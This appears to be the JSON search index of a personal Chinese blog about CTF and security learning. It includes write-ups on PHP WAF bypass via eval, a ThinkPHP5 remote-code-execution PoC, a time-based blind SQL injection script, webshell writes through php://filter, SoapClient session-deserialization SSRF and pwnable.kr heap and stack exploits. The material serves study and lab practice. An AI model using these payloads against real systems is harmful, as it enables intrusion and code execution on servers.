{"pages":[{"title":"404","text":"","path":"404/index.html","date":"09-09","excerpt":""},{"title":"plan","text":"","path":"plan/index-1.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-2.html","date":"09-20","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"09-09","excerpt":""},{"title":"不知道什么时候能提上日程的近期计划 👇","text":"2019-09-20 把 PWN 入门早点结束吧（求你了） 每周学习一个 Web 安全 读完码农翻身 读完程序员的自我修养","path":"plan/index.html","date":"09-20","excerpt":""},{"title":"藏着一些小秘密。。","text":"看看大哥收藏的 Web 安全Web-Security-Learning PWN 爷爷PWNABLEropemporium &gt;&gt; 一系列 ROP 题目Linux 系统函数大全一步一步学ROP之linux_x86篇 好好打 CTF 吧ctf-all-in-onectf-wiki &lt;&lt; 和上面这个一起食用 平台 CTF TIMES &lt;&lt; 很不错的平台Jarvis OJ实验吧bug kui 春秋php-security-calendar-2017","path":"collections/index.html","date":"09-11","excerpt":""},{"title":"随笔（乱几把写）","text":"2018-09-20 01:40:10 建这个是为了写点什么，但是建完之后又不知道写什么了。。。。写感想又怕太矫情，算了留着之后看看想写什么吧。","path":"essays/index.html","date":"09-20","excerpt":""},{"title":"surprised","text":"heheh :)","path":"surprised/index.html","date":"09-09","excerpt":""},{"title":"about","text":"死肥宅 真恶心","path":"about/index.html","date":"09-09","excerpt":""}],"posts":[{"title":"PHP 中绕过的小 TIPS","text":"来自一篇很有意思的文章：How To Exploit PHP Remotely To Bypass Filters &amp; WAF Rules 扫一下尘。。233 首先来一段简易 WAF：1234567&lt;?phpif(preg_match(&quot;/system/i&quot;,$_GET[&apos;code&apos;]))&#123; echo &quot;invalid syntax&quot;;&#125;else&#123; eval($_GET[&apos;code&apos;]);&#125;?&gt; 当然我知道，还有别的方法执行命令，这里讨论如何绕过 system。 我们知道（或许你刚刚才知道的），在 php 中可以这么表达一个字符串： 12345&lt;?php$a = &quot;\\x61&quot;;$b = &quot;\\141&quot;;$c = &quot;\\u&#123;0061&#125;&quot;; // 这里个 &#123;&#125;?&gt; 以上三个都能表示 a 这个字符。所以在这里我们可以这么绕过：system = \\x73\\x79\\x73\\x74\\x65\\x6d(这里转) 于是我们就可以提交：code = &quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&#39;whoami&#39;); 然后我们升级一下：(preg_match(&quot;/system|\\&quot;|&#39;/i&quot;,$_GET[&#39;code&#39;])) 这次我们过滤了单双引号，我们上一个 payload 在这里就行不通了。 但是我们又知道，在 PHP 中还可以这么表示字符串：12$a = (a);$b = (string)a; 当然，目前我们还是不能执行 system，我们可以用一下 php 中的字符串连接符（.）： (sy.(s).tem) 于是我们的第一个 payload 诞生了：(sy.(s).tem)(whoami); 虽然会有一些报错，但好在还是执行了。。 我们换个思路来玩玩：get_defined_functions 这个函数执行一下就知道了。会返回 php 中已经定义了得函数，包括内部的。自然，也有 system。 这是个二维数组，内部函数在 internal 这个数组中。我执行了一下，system 在我这得下标是 355。于是第三个 payload 如下： (get_defined_functions()[internal][355])(whoami); 当然还有个更简单的： ?a=system&amp;code=$_GET[a](whoami); 此外我们还可以利用类似： file_get_contents(substr(__FILE__,0,-19)); 然后再 substr 获取里面的内容来拼接。。这里的 __FILE__ 会多出来一些字符，所以用 substr 截断一下。 当然到这里我已经不知道有什么用了。。但觉得有意思就写下来了。。当作扫扫灰吧。。。","path":"2018/12/30/PHP 中绕过的小 TIPS/","date":"12-30","excerpt":""},{"title":"Thinkphp5 的任意代码执行","text":"粗糙的分析了一下。。2333 首先看看我们的 poc ： ?s=index/think\\app/invokefunction 然后在 library\\App.php 的 run 函数中： 那么 dispatch 是什么呢？ 由于我没有 debug 插件，所以用我最爱的 print_r，这里我用了 laysns（别问，随便挑的）：发现在此时 dispatch 是空的且与参数无关，那么就必然进入：if(empty($dispatch))此时的 $request 是 ThinkPHP 的 request 对象： 那我们跟入 routeCheck： 首先 path 是获取 参数 s 的值: 接下来似乎判断了，是否需要检测路由。 是否都无所谓，因为我们传的一般不在路由规则里，再接下来： 判断是否需要强制路由，如果开启了强制路由，那么就会异常退出。这也就是为什么漏洞描述说：在关闭强制路由的情况下。 然后就到了： 这里了，如果我们路由没匹配到，此处我们就的 $result 就还是空，此时就会进入 parseUrl 函数，这个函数就不过多分析了，就是拆分 $path（其实是压根没看。233） 看看此处的输出就很明了了： 数组第一个是控制器，第二个是类，第三个是方法 可以看到已经拆分成这样了，然后返回： 然后就一路执行到 self:exec 处。此时就执行了 payload 指定的类： think\\app 中的方法：invokefunction。 没错，但是这个文件： 这里用了反射，我不是特别明白。。反正能执行就对了。233 end。。。。（说实话这种洞放我我还真看不出来。。。）","path":"2018/12/17/Thinkphp5 的任意代码执行/","date":"12-17","excerpt":""},{"title":"记一道 web 题","text":"原文：https://www.anquanke.com/post/id/167637 这道题不算难吧。。（虽然看了 WP。。。） 源码太长了，不贴了。原题里有。。贴一下数据库的代码吧：1234567891011121314create database web500 charset=utf8;use web500;create table user( id int key auto_increment, user varchar(100), pass varchar(100));create table note( id int key auto_increment, user varchar(100), title varchar(100), content varchar(100));insert user values(1,&quot;admin&quot;,&quot;admin123&quot;); 首先大致的看看几个函数： 可以发现这里查询的时候都把 $user 转成 hex 了。 but。。。 是的，这里没有 tohex。我们可以看看这个 $user 是哪里来的： 可以看到这里 是从 session 获取的，那么 seesion 中的 user 是怎么来的呢？ 这里还注册了个 $admin 变量。记录登陆的用户是否为 admin 登陆成功后，从 $_POST[&#39;user&#39;] 中提取的。 利用流程：注册一个用户 -&gt; 登陆 -&gt; 添加note -&gt; 删除note。 哦~至于为什么要 admin 的密码，我们可以看： 最开始判断了是否为 admin。 这里好像能写 shell，但是此处限制了文件名的后缀 ，怎么绕过这个 preg_match 呢？ 此处正则：.+\\.ph(p[3457]?|t|tml)$ 可以发现正则最后有个 $，即：php/pht/pht 这样的后缀才会被匹配，说白了就是最后不能是 php/pht/phtml/ph2/3/4/5 这样，但是 phpa/phtb 这样的后缀正则表达式就匹配不到了。。。。 那么我们的后缀可以这样： php/. ，因为 / 是路径分隔符（吧？），所以创建 abc.php/. 相当于写入 abc.php。 注入ok。回到前面，我们发现可以注入，我们此时试试注入处 admin 的密码，手动几乎不可能的，我们考虑用用脚本吧 但是不管登陆注册我们都会发现有个这个，这个是判断验证码是否正确。。 且这里不能一个验证码多次使用。。。 但是。。。。这里并没有判断 $_SESSION[&#39;answer&#39;] 是否为空。 而生成验证码的是一段 html ：&lt;img src=&quot;valicode.php&quot;&gt; 当我们直接请求 register 时会先解释 php 代码。如果此时 answer 还没生成，那么当我们传入的 code 为 空时：&#39;&#39;==NULL 成立。 那怎么让他生成之前请求 register 呢？此处只需要把 SESSION 删了，即可。 于是写个jo本： 1234567891011121314151617181920212223242526272829303132333435import requestsimport timedef register(user,passwd): url=&quot;http://192.168.0.109/ctf/web500/test.php?action=register&quot; requests.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;) passdef login(user,passwd): s = requests.session() url=&quot;http://192.168.0.109/ctf/web500/test.php?action=login&quot; s.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;) return s passdef delete_note(s): url = &quot;http://192.168.0.109/ctf/web500/test.php?action=delete&amp;id=4&quot; s.get(url) passpayload = &quot;11&apos; or if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&quot;admin_pass = &quot;&quot;for i in range(1,100): print &quot;admin_pass : &quot;,admin_pass for a in &apos;abcdefghijklmnopqrstuvwxyz1234567890&apos;: payload_tmp = payload.format(offset=i,asc=a) register(payload_tmp,&apos;1234&apos;) s = login(payload_tmp,&apos;1234&apos;) t1 = time.time() delete_note(s) t2 = time.time() if t2-t1&gt;3: admin_pass+=a break; 我一开始还碰到了些问题，，好像是 and 和 or 的问题：1if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&apos; 如果最后的 or 1=&#39;&#39; 是 and 1=&#39;&#39; 的话，好像就不行。 同样的可以参考：12345select * from user where 1=(sleep(10)) and 1=&apos;&apos;; # 不触发 sleepselect * from user where 1=(sleep(10)) and 1=1; # 触发 sleepselect * from user where 1=1 and 1=(sleep(10)); # 触发 sleepselect * from user where 1=&apos;&apos; and 1=(sleep(10)); # 不触发 sleepselect * from user where 1=(sleep(3)) and 1=(sleep(10)); # 一直睡下去。。。 猜测可能是 如果 where 子句中有 and 先判断了耗时比较短的，如果耗时短的都不行那就没必要判断耗时长的了 以上是瞎猜的。。反正用 or 就对了。。233 但是好像有一些问题。。。会多跑出几个字符。。。md算了。。 跑出密码后就可以登陆了，此时使用 backup 功能。 发现 php/. 的后缀确实可以保存成 php 后缀的文件名，，但是： 当我们执行 newnote 添加一个 &lt;?php eval($_REQUEST[1])?&gt; 的时候： 这里使用了 htmlspecialchars： 于是便不能直接写一句话了。 这时候： 参考下p神的文章:谈一谈php://filter的妙用 得知我们可以在 文件操作的地方使用 php://filter 伪协议 我们可以 add_note 的时候添加：base64_encode(&#39;&lt;?php eval($_REQUEST[1])?&gt;&#39;)这个的结果：PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pPz4 此时调用 backup，文件名写：php://filter/convert.base64-decode/resource=test.php/. 注意这里是 base64-decode。。。 至此就已经拿到 shell 了。。 总结这题使用到的 trick : 二次注入 删除 SESSION 的方式绕过验证码 操作文件时使用 php://filter 伪协议。。","path":"2018/12/16/记一道 web 题/","date":"12-16","excerpt":""},{"title":"VulnHub JIS-CTF","text":"说实话真的很丢人，这道题真的很简单。。一开始挑这道题是因为这道题百度有 WP。。。唉~ WP 选手。 题目地址 一开始一个登陆界面，不知道怎么做？当然是扫目录啊。 扫到个 robots.txt [不想截图] 访问： 看到一些，但是并不是全部都能访问，一个一个访问吧： admin_area 里面有 第二个 flag 第一个 flag 在 /flag 里 然后利用 admin_area 获取到的用户名密码登陆，发现有个上传。然后任意上传，菜刀连接。。。目录的话在 robots.txt 里有的，是那个 uploaded_files 我用的是 metasploit 了，因为我菜刀连不上。。用的 multi/http/caidao_php_backdoor_exec 这个模块。。设置好就行了。。 进入 meterpreter 之后进入 shell，meterpreter 好像看不到文件的所属用户和组 这里看到 flag.txt 是读取不了的，所以读取 hint 看看，然后这里就有了第三个 flag 了 提示说拿到 technawi 的密码，这里是我看 wp 的地方。。原因是我确实不知道怎么找。。 使用命令： grep -rs technawi / 搜索 / 可太慢了，剧透直接搜索 /etc/ 然后打开这个： 第四个 flag 和 technawi 的密码 然后就是 ssh 远程连接。。打开刚刚那个 flag.txt ： 这里就结束了，，but，你有没有发现的用户是 root，没错，在我拿到 flag5 前我还注意到了 technawi 目录下有个 .sudo_as_admin_successful 这个文件，我在想会不会是可以 sudo 呢？ 于是我 sudo root。发现果真可以。。看看 /etc/sudoers 文件： 看，technawi 是 sudo 组的。 那么那个文件是干嘛的呢？？我也不知道，， 可以看看这里 反正每次 sudo 都会产生。。 关于 sudoers 那个文件我了解到也不是很透彻，可以参考：sudoers 借用里面的一张图就很明了了： ok,就这么多，下次尽量选个难点的。。233","path":"2018/12/02/VulnHub JIS-CTF/","date":"12-02","excerpt":""},{"title":"PWNABLE.kr --- simple login","text":"真的很 simple，我还做了很久，。。。 此题来自 ： pwnable.kr 代码： 很简单的代码，接收一个长度 30 之内的字符串进行 base64decode ，再判断长度是否大于 0xC，然后进入 auth 函数。 这里可以注意一下第 21 行，将输入的字符串 base64解码后的字符串（v4）复制到全局变量 input 中。 看看 auth 函数： 也很简单，把 input 取出来，md5，然后输出 md5，然后和 f87cd... 比较是否相等。 最后回到 main 函数第 22 行，如果相等那么就进入 correct 函数。 这里判断了 input 是否为 -559038737，难道让我们输入的是这个吗？ 怎么可能。。。把这个数字去 md5 加密一下就知道不对了。 过程一开始没仔细看 correct 函数，以为进入就直接获得 shell 了，所以在纠结能否直接通过 auth，为此我还去尝试解密 f87cd601aa7fedca99018a8be88eda34 这个。。无果。。。 那么我就在想会不会是哪里溢出了呢。。但是 main 函数里字符限制的都很好，于是我再一次进入了 auth 函数。 然后很理所当然的注意到： v4 长度是 8 ，但是 前面提到过 input 的长度是 0xC，即 12，所以刚好可以覆盖到上一层的 ebp 值 bingo，于是我们想到了： 123456781. 在 `auth` 函数覆盖上层函数 `ebp`，假设为 `fake_ebp`2. `auth` 退出后 `ebp` 为 `fake_ebp`3. 回到 `main` 函数也不会执行什么代码就退出了，此时执行： `leave` `ret`这两行代码很熟悉了，说白了就是：`leave = mov esp,ebp;pop ebp;``ret = pop eip` 但是不要忘了，在 auth 函数退出时也执行了 leave ; ret。 所以是执行了两次，所以我们还要找一个可以控制的地方，那么这个地方很显然只有一个 input 了。于是：1paylaod = &apos;a&apos;*4 + getshell_addr + input_addr 这里的 getshell_addr 是 correct 函数里 system(&#39;/bin/sh&#39;) 那一行。 这样在第一次执行完 leave ; ret 后 ebp 就指向了 input 的地址（’aaaa’ 的地方），然后第二次执行的时候：12leave = mov esp,ebp(aaaa 的位置) ; pop ebp (此处可以无视 `ebp`，但是 `esp+4` 了，所以 `esp` 指向了 `getshell_addr` 的位置 )ret = mov eip,esp（此时指向了 `getshell_addr` 的位置了。） ok，到这里分析完了。。。 然而我第一次的 payload 尽然是：&#39;a&#39;*8 + getshell_addr-4 还久久的没反应过来，调试了才发现的。哎，打扰了。。","path":"2018/11/27/PWNABLE.kr --- simple login/","date":"11-27","excerpt":""},{"title":"LCTF bestphps_revenge 复现总结","text":"彩笔只能复现 :( 知识点 首先看看 php 中 SESSION 默认是怎么存储的：12345&lt;?phpsession_start();$_SESSION[&apos;a&apos;]=&apos;1&apos;;$_SESSION[&apos;b&apos;]=&apos;1&apos;;?&gt; 打开 session 文件： a|s:1:”1”;b|s:1:”1”; 但是 php 还有另一种存储方式（不跟你说你还不知道吧~）：http://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler 另一种存储方式叫：php_serialize，默认的叫什么？叫：php 设置有三种方法：1231. 在 php.ini 中修改这一行： session.serialize_handler = php2. ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);3. session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;)); 第三种方法是 php7 加上的： 注意是 7 才加上的！！！其他的 seesion 参数应该也能改。 好了好了，来看看 php_serialize 是怎么存储 SESSION 数据的： 12345&lt;?phpsession_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));$_SESSION[&apos;a&apos;]=&apos;1&apos;;$_SESSION[&apos;b&apos;]=&apos;1&apos;;?&gt; a:2:{s:1:”a”;s:1:”1”;s:1:”b”;s:1:”1”;} 没错，用过 serialize 函数的都看得出来这直接用了这个函数序列化的（刚刚给的文档里也有说。。。） 接下来再详细点，我们看看 php 模式是怎么存储对象的：1234567891011&lt;?phpclass Test&#123; public $test_variable = &quot;niubi&quot;; public function __destruct()&#123; echo $this-&gt;test_variable; &#125;&#125;session_start();$_SESSION[&apos;a&apos;]=&apos;1&apos;;$_SESSION[&apos;b&apos;]=new Test();?&gt; a|s:1:”1”;b|O:4:”Test”:1:{s:13:”test_variable”;s:5:”niubi”;} php_serialize 呢？ a:2:{s:1:”a”;s:1:”1”;s:1:”b”;O:4:”Test”:1:{s:13:”test_variable”;s:5:”niubi”;}} 可以发现这里也有共同点：O:4:&quot;Test&quot;:1:{s:13:&quot;test_variable&quot;;s:5:&quot;niubi&quot;;}（不信就按 ctrl+f 看看） 来一个有意思的例子：（此处建议先清空 SESSION 或者干脆直接删掉 SESSION 文件也可以） 1234567891011//a.php&lt;?phpclass Test&#123; public $test_variable = &quot;niubi&quot;; public function __destruct()&#123; echo $this-&gt;test_variable; &#125;&#125;session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));$_SESSION[&apos;a&apos;]=&apos;a|s:1:&quot;b&quot;;c|O:4:&quot;Test&quot;:1:&#123;s:13:&quot;test_variable&quot;;s:5:&quot;niubi&quot;;&#125;&apos;;?&gt; 1234567891011//b.php&lt;?phpclass Test&#123; public $test_variable = &quot;niubi&quot;; public function __destruct()&#123; echo $this-&gt;test_variable; &#125;&#125;session_start();var_dump($_SESSION);?&gt; 是的，这两个 php 文件用了不同的序列化方式。先访问 a.php ，此时 SESSION 文件应该是： a:1:{s:1:”a”;s:60:”a|O:4:”Test”:1:{s:13:”test_variable”;s:5:”niubi”;} 分析一下此时访问 b.php 会怎么解析呢： c 为 第个键，Test 对象为值。（这里其实还会执行 test 对象的 __destruct 函数） 访问一下 b.php： bingo~ 回到正题。。。。没错，正题是题目，别忘了这是个题目分析的文章。。。 题目代码：12345678910111213&lt;?php//index.phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&#123; $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; 12345678910111213141516&lt;?php//flag.php&lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;$_GET[&apos;f&apos;]=&quot;session_start&quot;;$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;call_user_func($_GET[&apos;f&apos;],$_POST);session_start();if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; 没错，这是到 SSRF，怎么 SSRF 暂且不提。 先想想怎么利用： 从 flag.php 可以看出把 flag 放到 SESSION 里了。 PHP 里有个内置类可以访问 Web。 我前面都铺垫了这么长了，所以这么玩： 通过 session 处理的差异反序列化 某个类 访问 flag.php 。 利用那么某个类是哪个类：SOAP SOAP 是什么。。怎么操作我就不详细解释了（我也不会） 飘零师傅会： https://www.anquanke.com/post/id/153065#h2-5 这里给出利用代码：12345678910&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null,array( &apos;location&apos; =&gt; $target, &apos;user_agent&apos;=&gt;&quot;niuniu^^Cookie: PHPSESSID=s5ndonmikgkcif6q28k0aptnf0^^Content-Type: text/html;charset=UTF-8^^^^&quot;, &apos;uri&apos; =&gt; &quot;/&quot;));$attack = str_replace(&apos;^^&apos;,&quot;\\n\\r&quot;,serialize($attack));$payload = urlencode($attack);echo $payload; 这里注意 str_replace 中使用的是 \\n\\r 而不是 \\r\\n输出出来的便是 payload。 1. 开启 php_serialize 模式回顾一下题目的代码注意这一行：1call_user_func($_GET[f],$_POST); 我们将 f 设置为 session_start.$_POST 是个天然的数组，所以 POST 数据为：1serialize_handler=php_serialize 可以在代码的最前面添加上：12$_GET[&apos;f&apos;]=&quot;session_start&quot;;$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;; 这样就相当于 GET 和 POST 传值了 （我没有 hackbar ，不想 POST 传啊） 2.再看看这三行： 123if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125; 这不就是直接帮我们写进 SESSION 文件吗？测试中发现 $_GET[‘name’] 不能写在代码中，所以还是老老实实的写在 url 里吧（在测试中遇到了个很奇怪的问题。。。） 所以最后参数分别是： 123$_GET[&apos;f&apos;] = &apos;session_start&apos;;$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;$_GET[&apos;name&apos;] = &apos;|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A1%3A%22%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A95%3A%22niuniu%0A%0DCookie%3A+PHPSESSID%3Ds5ndonmikgkcif6q28k0aptnf0%0A%0DContent-Type%3A+text%2Fhtml%3Bcharset%3DUTF-8%0A%0D%0A%0D%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&apos;; // name 用 `url` 传递 我们可以新开个文件并访问：1234&lt;?phpsession_start();var_dump($_SESSION);?&gt; 会发现已经有我们的 SOAP 对象了。 接下来使用再调用一下对象就可以了，第二次调用的参数就是： 12$_GET[&apos;f&apos;] = &apos;extract&apos;;$_POST[&apos;b&apos;]=&apos;call_user_func&apos;; 就可以了。 f 的目的在于 将 b 覆盖成 call_user_func，在最后的： call_user_func($b,$a); 就会执行 SOAP 了。 ##结语 写到最后心态崩了。。前面分析 php 序列化还比较满意，写到 CTF 题时遇到了很多问题也没写好。。。所以还不如直接看参考中的 WP。 参考： https://xz.aliyun.com/t/3336#toc-3（这题的 WP）https://github.com/CTFTraining/lctf_2018_bestphp_s_revenge/tree/master/files/src（这里有源码）","path":"2018/11/27/LCTF bestphps_revenge 复现总结/","date":"11-27","excerpt":""},{"title":"sql 注入的一些小姿势","text":"利用已知列名爆 库名 和 表名 可以发现必须要列名正确，类似的一共有：polygon、multipoint、multilinestring、multipolygon、linestring 用已知库名爆列名 原理嘛。。。不是很清楚 语句：and (select * from (select * from mysql.user a join mysql.user b using(Host,User))c); 绕过列名爆数据 select table_schema,table_name from information_schema.tables where table_name=&#39;session&#39; union select 1,(select h.2 from (select 1,2 union select user,host from mysql.user limit 1 offset 3 )h); 这里的关键应该在： select h.2 from (select 1,2 union select user,host from mysql.user limit 1 offset 3 )h 可以发先列名变成了我们构造的，应该是因为 union 会使用 第一个 select 的语句作为列名。","path":"2018/11/11/sql 注入的一些小姿势/","date":"11-11","excerpt":""},{"title":"堆溢出2 -- 从 ruozhi 的角度看 pwnable.kr 的 unlink","text":"来自 pwnable.kr 的一道特别的 unlink 题这题的程序 首先先看看代码吧：12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system(&quot;/bin/sh&quot;);&#125;void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A); printf(&quot;here is heap address leak: %p\\n&quot;, A); printf(&quot;now that you have leaks, get shell!\\n&quot;); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 分析程序不是很长，很容易懂： 自定了个类似 chunk 的结构 自定了个 unlink 函数（原 unlink 函数已经有保护了，所以利用不起来。） 申请了三个 chunk gets 函数这里可以写任意长度的数据，可以覆盖 B 的 chunk 程序还有个 shell 函数，将 eip 指向此处即可，不需要写 shell 了。 这里泄露了 heap 和 stack 的地址 利用现在最大的问题就是，将 shell 的地址写到哪里可以控制 eip ？ （此时无耻的翻一下 WP） 程序分析查看该程序的汇编代码： objdump -M intel -S unlink翻到 main 函数的最后，可以注意到几句有意思的代码： 123480485ff: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4]8048602: c9 leave 8048603: 8d 61 fc lea esp,[ecx-0x4]8048606: c3 ret ebp 的地址？ 在这里把 [ecx-0x4] 的值给了 esp，然后调用了 ret，所以此处只要能控制 ecx-0x4 下的值，就可以控制 eip ecx 又来自 ebp-0x4，但是程序已经泄露了 变量A 的地址了，我们可以通过 A 的地址偏移某个值得到 EBP，这个不是重点，所以在这里先说偏移量：EBP = A + 0x14。 将 shellcode 地址写在哪里？ 将上面的代码解析一下： *(*(ebp-4)-4) = shellcode地址。 所以地址 *(ebp-4)-4 下的内容我们也要控制。正好我们还有一块地址： 变量A 。 直接看 payload 吧： shellcode_addr(1) + 填充(2) + （ 变量A + 8 +4）（3） + EBP-0x4（4） shellcode_addr 可以通过程序获取到： 0x80484eb 填充是 （16-4） 个，（其实我觉得 buf 应该是 8 个字节，但是从调试看来 buf 好像有 16 个字节一样，可能是对齐？） 变量A 的地址指向的是 fd，但是 shellcode_addr 在 buf 处，所以要加上 8，又因为还要过会还要 -4 ，所以再加上 4 。 *(ebp-4) 处取的是 ebp-4 的位置，故 -4。 ok，payload 构造完了，利用起来就可以了。 再说说怎么得到的 A 相对 EBP 的偏移量，我们幻想一下栈： 12345A &lt;=== 泄露地址B -0x4C -0x8EBP -0xCEIP -0x10 这么计算起来 EBP 应该位于 A-0xC 处，但是实际上却是 0x14 除，中间多出来的 8 个字节我也不知道是啥，但是我们可以通过 gdb 调试的方式得到这个偏移（当然我一开始也是看的 WP）。 贴一下代码：12345678910111213141516171819202122232425from pwn import *p = process(&apos;./unlink&apos;)p.recvuntil(&apos;stack address leak: &apos;)stack_addr = p.recvuntil(&apos;\\n&apos;)p.recvuntil(&apos;heap address leak: &apos;)heap_addr = p.recvuntil(&apos;\\n&apos;)stack_addr = int(stack_addr,16)heap_addr = int(heap_addr,16)shell_addr = 0x80484ebebp = stack_addr + 0x14print &quot;stack : &quot;+ str(hex(stack_addr))print &quot;heap : &quot;+ str(hex(heap_addr))payload = p32(shell_addr) + &apos;a&apos;*12 + p32(heap_addr + 12) + p32(ebp-4)#gdb.attach(p)#pause()p.recvuntil(&apos;shell!&apos;)p.sendline(payload)p.interactive()","path":"2018/10/28/从ruozhi 的角度看 pwnable 的 unlink/","date":"10-28","excerpt":""},{"title":"堆溢出1 -- unlink","text":"原文 照着这篇文章写的，不算翻译吧（毕竟我英文差的**） 这篇文章将学习怎么使用 unlink 来进行堆溢出，先看看漏洞程序：123456789101112131415161718/* Heap overflow vulnerable program. */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] )&#123; char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 ); if(argc!=1)/*[3]*/ strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );&#125; 先看看程序的 [3] 中做了什么： 将 argv[1] 复制进堆块 first 中 且没有任何限制，因此当用户输入一个大于 666 字节就会覆盖下一个 chunk 。 首先分析下 glibc malloc 在 free 的时候都做了什么吧。 当输入的字节小于 666 字节时，在 [4] 中做了如下操作： 1. 非 mmap 的 chunk，合并 前/后 的块 2. 合并上一个块： * 如果当前释放的 chunk 中的 P 位为 0，就将上一个块在 `bins` 中移除（ `unlink` 操作），将当前块的大小增加上上一个块的大小 并且 将当前块指向上一个块。 * 在这个例子中 P 位为 1（第一个块默认的 P 位都为 1，尽管上一个块不存在）。 3. 合并下一个块： * 当下一个块为 free 时，将下一个块从 bins 中移除（ 也是执行 `unlink` ），将当前块的大小加上下一个块的大小。（在这里例子中下一个块为 second，所以也不会合并） * 有意思的是，获取下一个块是否为 free 是根据下下个块的 P 位来决定的。 4. 然后添加 合并后的块 到 unsorted bin 中。在这里例子中没有发生合并，所以只用将 first 添加到 unsorted bin 就好。 下面说说攻击者在第三行中覆盖 second 这块内存的内容： prev_size = 覆盖成偶数（使 PREV_INUSE 位为 0） size = -4 fd = free address -12 bk = shellcode address 在攻击者的用向下，[4] 做了如下事： 合并上下堆块 合并上一个块：和上面分析的一样，不再重复 合并下一个块： 判断下一个块是否为空闲，前面提到过是根据下下个块的 P 位来判断的。那么怎么找到下下个块的地址呢？就是：下一个块的地址+下一个块大小。在这里我们把下一块的大小变成了-4，所以他 下一块的地址（prev_size）+（-4） 又指向了自己 回顾一下 unlink 的过程： 1. 首先传入要 unlink 的堆块，假定变量 P 2. BK = P-&gt;bk , FD = P-&gt;fd // 将 P 的 bk 和 fd 分别给 BK 和 FD 变量 3. FD-&gt;bk = BK, BK-&gt;fd = FD（因为用文字太绕了。） 4. //用文字描述就是：当前块的上一个块的下一个块（即：(P-&gt;bk)BK-&gt;fd） 等于 当前块的下一块。下一块的上一块同理。 来张图比什么都清晰： —此图来自 ctf-wiki 回到上面，在 [3] 处覆盖了 second 堆块后：此时 second 堆应该是这样的： second 字段 —– 值 prev_size —– 偶数（最后一位为 P 位，只要是偶数最后一位就为 0，因此偶数即可） size —– -4 （减去4，指向了自己） fd —– GOT入口-12 （稍后解释） bk —– shellcode 地址 回顾一下代码的 [4]：free(first) 执行这句话的时候发生了什么？ 释放掉 first 块 判断上一个块是否空闲，在这里不是空闲的，所以跳过 判断下一个块是否空闲，在这里判断的是 second 块，原本应该是 非空闲 的，but 这里的 size 是 -4，所以取下下块的时候又跑到了自己块的 prev_size 处，这里的值是偶数，所以 P 位为0，所以就未占用咯，所以要合并咯，合并就要用到 unlink 咯。 那么在这里 unlink 都做了什么呢？ 1234FD = P-&gt;fd （ FD = GOT入口-12 ）BK = P-&gt;bk （ BK = shellcode地址 ）FD-&gt;bk = BK（ FD-&gt;bk = GOT入口，因为 FD 是 GOT-12，bk 位于 FD 12个字节处，所以 FD-&gt;bk 就等于 FD+12 的地址 ）BK-&gt;fd = FD（这里是什么不重要了，但是此处的内容也会被破坏，所以要注意） 在这里 GOT 入口表被覆盖成 shellcode 地址了。 这里覆盖 GOT 入口表本身没什么意义，只是一个思路吧，当作迈出去的第一步。 至此， unlink 的利用就算结束了，下篇文章分析一道，123while True: print &quot;特别特别特别&quot;print 